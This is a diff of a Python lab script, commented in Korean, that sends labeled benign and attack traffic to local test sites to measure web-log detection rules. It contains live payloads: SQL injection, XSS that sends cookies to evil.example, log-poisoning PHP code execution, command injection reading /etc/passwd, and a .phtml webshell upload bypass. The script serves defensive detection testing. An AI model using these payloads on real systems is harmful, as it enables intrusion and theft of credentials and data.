@@ -2,12 +2,12 @@
 """
 로컬 테스트 사이트를 상대로 "정답을 아는" 트래픽을 만든다.
 
-- 정상 사용자 트래픽(오탐 측정용)과, 유형별 공격 트래픽을 서로 다른 (가짜)공인 IP로 보낸다.
-- 각 공격이 어떤 규칙으로 잡혀야 하는지(정답)를 ground_truth.json 에 기록한다.
-- 공격은 오직 이 로컬 서버(127.0.0.1)에만 보낸다. 외부 사이트로는 아무것도 보내지 않는다.
-
-TEST-NET IP 대역(198.51.100.x, 203.0.113.x)만 X-Forwarded-For 로 쓴다(공인이지만 실제로는
-라우팅되지 않는 문서용 대역). 실행 전 lab/serve.sh start 로 서버를 띄워 둔다.
+- 정상 사용자 트래픽(브라우저·검색엔진 봇·정적 파일, 그리고 정상인데 공격처럼 보이는
+  검색어 — 오탐을 시험하는 함정)과, 공격 시나리오를 서로 다른 (문서용) IP로 보낸다.
+- 각 시나리오의 기대 규칙을 ground_truth.json 에 기록한다.
+- "detectable": false 인 시나리오는 접속 로그로는 볼 수 없는 공격(사각지대)이다. 채점 때
+  재현율에 넣지 않고 따로 보고한다. 숨기지 않기 위해 남긴다.
+- 공격은 오직 이 로컬 서버(127.0.0.1)에만 보낸다.
 """
 from __future__ import annotations
 
@@ -20,15 +20,20 @@ from pathlib import Path
 LAB = Path(__file__).resolve().parent
 SHOP = "http://127.0.0.1:8081"
 BOARD = "http://127.0.0.1:8082"
+SHOP_ACCESS_LOG = LAB / "logs" / "shopmall_access.log"
 BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/140.0 Safari/537.36")
+GOOGLEBOT_UA = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
 
 truth: list[dict] = []
 
 
-def req(url, ip, ua=BROWSER_UA, method="GET", data=None, form=None, out=False):
-    cmd = ["curl", "-s", "-o", "/dev/null" if not out else "-", "-w", "%{http_code}",
+def req(url, ip, ua=BROWSER_UA, method="GET", data=None, form=None, cookie=None):
+    """요청 한 번. 응답 코드를 돌려준다. X-Forwarded-For 로 클라이언트 IP를 흉내 낸다."""
+    cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
            "-H", f"X-Forwarded-For: {ip}", "-A", ua, "-X", method]
+    if cookie:
+        cmd += ["-H", f"Cookie: {cookie}"]
     for k, v in (data or {}).items():
         cmd += ["--data-urlencode", f"{k}={v}"]
     if data and method == "GET":
@@ -36,34 +41,63 @@ def req(url, ip, ua=BROWSER_UA, method="GET", data=None, form=None, out=False):
     for k, path in (form or {}).items():
         cmd += ["-F", f"{k}=@{path}"]
     cmd.append(url)
-    r = subprocess.run(cmd, capture_output=True, text=True)
-    return r.stdout
+    return subprocess.run(cmd, capture_output=True, text=True).stdout.strip()
 
 
-def record(scenario, site, ip, rules, desc, malicious=True):
+def body(url, ip, cookie=None, ua=BROWSER_UA, data=None):
+    """응답 본문을 돌려준다(공격 성공 여부를 실제로 확인할 때 쓴다)."""
+    cmd = ["curl", "-s", "-H", f"X-Forwarded-For: {ip}", "-A", ua]
+    if cookie:
+        cmd += ["-H", f"Cookie: {cookie}"]
+    for k, v in (data or {}).items():
+        cmd += ["--data-urlencode", f"{k}={v}"]
+    if data:
+        cmd += ["-G"]
+    cmd.append(url)
+    return subprocess.run(cmd, capture_output=True, text=True).stdout
+
+
+def record(scenario, site, ip, rules, desc, malicious=True, detectable=True):
     truth.append({"scenario": scenario, "site": site, "attacker_ip": ip,
-                  "expected_rules": rules, "description": desc, "malicious": malicious})
+                  "expected_rules": rules, "description": desc,
+                  "malicious": malicious, "detectable": detectable})
 
 
+# ------------------------------------------------------------------ 정상 사용자
 def benign():
-    """정상 사용자 — 아무 규칙에도 안 걸려야 한다(오탐 측정)."""
+    """정상 사용자 — 아무 규칙에도 안 걸려야 한다(오탐 측정). 검색어 함정 포함."""
     for ip in ("203.0.113.10", "203.0.113.11", "203.0.113.12"):
         req(f"{SHOP}/", ip)
+        req(f"{SHOP}/static/style.css", ip)
+        req(f"{SHOP}/product.php?id={3 + int(ip[-1])}", ip)
         req(f"{SHOP}/search.php", ip, data={"q": "노트북"})
-        req(f"{SHOP}/view.php", ip, data={"page": "about.txt"})
         req(f"{SHOP}/login.php", ip, method="POST", data={"username": "guest", "password": "guest"})
+    # 함정: 따옴표·단어가 SQL처럼 보이지만 정상인 검색어
+    for ip, q in (("203.0.113.30", "select color from menu"),
+                  ("203.0.113.31", "keyboard and mouse"),
+                  ("203.0.113.32", "1 or 2 people headset")):
+        req(f"{SHOP}/search.php", ip, data={"q": q})
+    # 검색엔진 봇
+    req(f"{SHOP}/robots.txt", "203.0.113.40", ua=GOOGLEBOT_UA)
+    req(f"{SHOP}/product.php?id=7", "203.0.113.40", ua=GOOGLEBOT_UA)
+    req(f"{SHOP}/product.php?id=8", "203.0.113.40", ua=GOOGLEBOT_UA)
+    # 후기 등록(정상 사용자)
+    req(f"{SHOP}/review.php", "203.0.113.41", method="POST",
+        data={"product_id": "3", "author": "민지", "body": "배송 빠르고 좋아요"})
+    # 게시판(정상)
     for ip in ("203.0.113.20", "203.0.113.21"):
         req(f"{BOARD}/", ip)
         req(f"{BOARD}/bbs/list.php", ip, data={"id": "1"})
         req(f"{BOARD}/bbs/download.php", ip, data={"file": "notice.txt"})
         req(f"{BOARD}/bbs/login.php", ip, method="POST", data={"uid": "tester", "pw": "1234"})
-    record("benign", "both", "203.0.113.*", [], "정상 사용자 트래픽", malicious=False)
+    record("benign", "both", "203.0.113.*", [], "정상 사용자·검색엔진 봇·함정 검색어", malicious=False)
 
 
+# ------------------------------------------------------------------ 정찰·탐색
 def scan_recon():
     ip = "198.51.100.50"
     paths = ["/wp-login.php", "/wp-admin/", "/administrator/", "/phpmyadmin/", "/.git/HEAD",
-             "/backup.zip", "/old/", "/test.php", "/config.bak", "/admin/", "/manager/html",
+             "/backup.zip", "/old/", "/test.php", "/config.bak", "/manager/html",
              "/xmlrpc.php", "/vendor/phpunit/", "/server-status", "/.svn/entries",
              "/cgi-bin/test.cgi", "/shell.php", "/db.sql", "/info.php", "/api/v1/users"]
     for p in paths:
@@ -72,19 +106,50 @@ def scan_recon():
            "스캐너 UA + 없는 경로 20개 연속 탐색")
 
 
-def sqli_dump():
+def sensitive_files():
+    ip = "198.51.100.25"
+    for p in ["/.env", "/config.php", "/wp-config.php", "/.git/config"]:
+        req(f"{SHOP}{p}", ip)
+    record("sensitive_files", "shopmall", ip, ["WEBLOG_SENSITIVE_FILE"], "설정·비밀 파일 접근 시도")
+
+
+# ------------------------------------------------------------------ 침투
+def sqli_union():
     ip = "198.51.100.23"
-    payloads = ["' UNION SELECT username,password FROM users-- -",
-                "' OR '1'='1", "%' UNION SELECT username,password FROM users-- -",
-                "' AND 1=2 UNION SELECT username,password FROM users-- -"]
-    for q in payloads:
+    for q in ["' UNION SELECT username,password FROM users-- -",
+              "' OR '1'='1", "%' UNION SELECT username,password FROM users-- -",
+              "' AND 1=2 UNION SELECT username,password FROM users-- -"]:
         req(f"{SHOP}/search.php", ip, data={"q": q})
     ipb = "198.51.100.63"
     for q in ["0 UNION SELECT uid,pw FROM members", "1 AND 1=1", "1; DROP TABLE x--",
               "0 UNION SELECT uid,pw FROM members-- -"]:
         req(f"{BOARD}/bbs/list.php", ipb, data={"id": q})
-    record("sqli_dump", "shopmall", ip, ["WEBLOG_SQLI"], "검색창 UNION 기반 계정정보 추출")
-    record("sqli_dump", "board", ipb, ["WEBLOG_SQLI"], "게시물 id UNION 기반 추출")
+    record("sqli_union", "shopmall", ip, ["WEBLOG_SQLI"], "검색창 UNION 기반 계정정보 추출")
+    record("sqli_union", "board", ipb, ["WEBLOG_SQLI"], "게시물 id UNION 기반 추출")
+
+
+def sqli_bulk_dump():
+    """항상 참인 조건으로 상품 2,000개를 한꺼번에 빼낸다 → 큰 응답이 나가는지 본다."""
+    ip = "198.51.100.28"
+    got = body(f"{SHOP}/search.php", ip, data={"q": "' OR 1=1 -- "})
+    record("sqli_bulk_dump", "shopmall", ip, ["WEBLOG_SQLI", "WEBLOG_LARGE_EXFIL"],
+           f"항상 참 조건으로 전체 목록 덤프(응답 {len(got):,}자)")
+
+
+def xss_reflected():
+    ip = "198.51.100.29"
+    req(f"{SHOP}/search.php", ip, data={"q": "<script>document.location='http://evil.example/?c='+document.cookie</script>"})
+    req(f"{SHOP}/search.php", ip, data={"q": "\"><img src=x onerror=alert(1)>"})
+    record("xss_reflected", "shopmall", ip, ["WEBLOG_XSS"], "검색어로 쿠키 탈취 스크립트 반사")
+
+
+def stored_xss_review():
+    """후기 본문에 스크립트를 저장한다. 접속 로그에는 POST 본문이 남지 않으므로 탐지 불가(사각지대)."""
+    ip = "198.51.100.31"
+    req(f"{SHOP}/review.php", ip, method="POST",
+        data={"product_id": "5", "author": "guest", "body": "<script>fetch('http://evil.example/?c='+document.cookie)</script>"})
+    record("stored_xss_review", "shopmall", ip, [],
+           "후기 본문에 저장형 XSS 스크립트 저장(POST 본문은 접속 로그에 없음)", detectable=False)
 
 
 def traversal_lfi():
@@ -98,6 +163,18 @@ def traversal_lfi():
     record("traversal_lfi", "board", ipb, ["WEBLOG_TRAVERSAL"], "다운로드 경로 조작")
 
 
+def log_poisoning_rce():
+    """LFI → 로그 포이즈닝 → 실행. 1) User-Agent에 PHP 코드를 심어 접속 로그에 남기고
+    2) 언어 파일 include 취약점으로 그 로그를 읽어 실행시킨다. 실제로 명령이 실행되는지 확인한다."""
+    ip = "198.51.100.32"
+    req(f"{SHOP}/product.php?id=2", ip, ua="<?php system($_GET['c']); ?>")
+    out = body(f"{SHOP}/lang.php", ip, data={"f": str(SHOP_ACCESS_LOG), "c": "id"})
+    executed = "uid=" in out
+    record("log_poisoning_rce", "shopmall", ip, ["WEBLOG_CODE_IN_HEADER", "WEBLOG_TRAVERSAL"],
+           "UA에 PHP 코드 심기 → include로 접속 로그 실행" + ("(명령 실행 확인)" if executed else "(실행 실패)"))
+    truth[-1]["verified_executed"] = executed
+
+
 def cmd_injection():
     ip = "198.51.100.65"
     for h in ["127.0.0.1;id", "127.0.0.1;cat /etc/passwd", "x|id", "x;uname -a"]:
@@ -105,18 +182,10 @@ def cmd_injection():
     record("cmd_injection", "board", ip, ["WEBLOG_CMD_INJECTION"], "점검 도구 host 파라미터 명령 삽입")
 
 
-def sensitive_files():
-    ip = "198.51.100.25"
-    for p in ["/.env", "/config.php", "/wp-config.php", "/.git/config"]:
-        req(f"{SHOP}{p}", ip)
-    record("sensitive_files", "shopmall", ip, ["WEBLOG_SENSITIVE_FILE"], "설정·비밀 파일 접근 시도")
-
-
 def brute_login():
     ip = "198.51.100.26"
     for i in range(15):
-        req(f"{SHOP}/login.php", ip, method="POST",
-            data={"username": "admin", "password": f"guess{i}"})
+        req(f"{SHOP}/login.php", ip, method="POST", data={"username": "admin", "password": f"guess{i}"})
     req(f"{SHOP}/login.php", ip, method="POST", data={"username": "admin", "password": "S3cretPass!"})
     record("brute_login", "shopmall", ip,
            ["WEBLOG_AUTH_BRUTE", "WEBLOG_AUTH_SUCCESS_AFTER_FAIL"],
@@ -129,25 +198,39 @@ def brute_login():
            ["WEBLOG_AUTH_BRUTE", "WEBLOG_AUTH_SUCCESS_AFTER_FAIL"], "게시판 로그인 무차별 대입")
 
 
+def default_admin_takeover():
+    """설치 후 바꾸지 않은 기본 관리자 계정으로 들어가 회원·상품 목록을 통째로 내려받는다."""
+    ip = "198.51.100.33"
+    req(f"{SHOP}/admin/members.php", ip)                       # 1) 인증 없이 접근 → 로그인으로 튕김
+    req(f"{SHOP}/admin/login.php", ip, method="POST",          # 2) 기본 계정 로그인 성공
+        data={"username": "shopadmin", "password": "admin"})
+    out = body(f"{SHOP}/admin/members.php", ip, cookie="admin=1")  # 3) 관리자 목록 내려받기
+    record("default_admin_takeover", "shopmall", ip,
+           ["WEBLOG_ADMIN_ACCESS", "WEBLOG_LARGE_EXFIL"],
+           f"기본 관리자 계정 로그인 후 회원·상품 목록 {len(out):,}자 내려받기")
+
+
 def webshell_chain():
-    """가장 중요한 시나리오: 웹셸 업로드 → 디스크에 파일 생성 → 실행. '침해 확인' 이 나와야 한다."""
+    """업로드 우회 → 실행 → 명령 실행. .php 는 막히고 .phtml 은 통과해 실행된다(실제 흔한 우회)."""
     ip = "198.51.100.27"
-    # 테스트용 최소 웹셸(로컬 전용 아티팩트). 디스크에 실제로 남아 webscan 이 찾는다.
-    shell = LAB / "runtime" / "art.php"
-    shell.write_text("<?php system($_GET['cmd']); // local test webshell\n", encoding="utf-8")
-    req(f"{SHOP}/upload.php", ip, method="POST", form={"file": str(shell)})
+    rt = LAB / "runtime"
+    rt.mkdir(exist_ok=True)
+    code = "<?php system($_GET['cmd']); ?>\n"
+    (rt / "shell.php").write_text(code, encoding="utf-8")
+    (rt / "shell.phtml").write_text(code, encoding="utf-8")
+    req(f"{SHOP}/upload.php", ip, method="POST", form={"file": str(rt / "shell.php")})     # 막힘(400)
+    req(f"{SHOP}/upload.php", ip, method="POST", form={"file": str(rt / "shell.phtml")})   # 통과
     time.sleep(0.3)
     for c in ["id", "uname -a", "cat /etc/passwd"]:
-        req(f"{SHOP}/uploads/art.php", ip, data={"cmd": c})
+        req(f"{SHOP}/uploads/shell.phtml", ip, data={"cmd": c})
     record("webshell_chain", "shopmall", ip,
            ["WEBLOG_UPLOAD_EXEC", "WEBLOG_WEBSHELL_ACCESS", "FILE_WEBSHELL"],
-           "웹셸 업로드 후 업로드 폴더의 .php 를 cmd 파라미터로 실행")
+           "업로드 우회(.php 차단 → .phtml 통과) 후 cmd 파라미터로 실행")
 
 
 def write_synthetic_authlog():
-    """웹 침해가 서버 계정 탈취로 이어진 상황을 보여 주려고 auth.log 를 합성한다.
-    (로컬에서 실제 SSH 무차별 대입을 돌리기 어려워 합성하며, 문서에 그 사실을 밝힌다.)
-    공격자 IP는 웹셸 시나리오와 같은 198.51.100.27 로 맞춰 교차 상관을 확인한다."""
+    """웹 침해가 서버 계정 탈취로 이어진 상황. auth.log 는 로컬에서 실제 SSH 공격을 돌리기
+    어려워 합성한다(공격자 IP를 웹셸 시나리오와 맞춰 교차 상관만 본다)."""
     ip = "198.51.100.27"
     base = datetime.now(timezone.utc).replace(microsecond=0)
     lines = []
@@ -171,20 +254,26 @@ def write_synthetic_authlog():
 def main():
     benign()
     scan_recon()
-    sqli_dump()
-    traversal_lfi()
-    cmd_injection()
     sensitive_files()
+    sqli_union()
+    sqli_bulk_dump()
+    xss_reflected()
+    stored_xss_review()
+    traversal_lfi()
+    log_poisoning_rce()
+    cmd_injection()
     brute_login()
+    default_admin_takeover()
     webshell_chain()
     write_synthetic_authlog()
     (LAB / "logs" / "ground_truth.json").write_text(
         json.dumps({"generated_at": datetime.now(timezone.utc).isoformat(), "scenarios": truth},
                    ensure_ascii=False, indent=1), encoding="utf-8")
-    print(f"공격 트래픽 생성 완료: 시나리오 {len(truth)}개")
+    print(f"트래픽 생성 완료: 시나리오 {len(truth)}개")
     for t in truth:
-        print(f"  [{t['scenario']:16s}] {t['site']:9s} {t['attacker_ip']:15s} "
-              f"→ 기대규칙 {', '.join(t['expected_rules']) or '(없음/정상)'}")
+        tag = "" if t["detectable"] else "  [사각지대]"
+        print(f"  [{t['scenario']:20s}] {t['site']:9s} {t['attacker_ip']:15s} "
+              f"→ 기대 {', '.join(t['expected_rules']) or '(없음/정상)'}{tag}")
 
 
 if __name__ == "__main__":
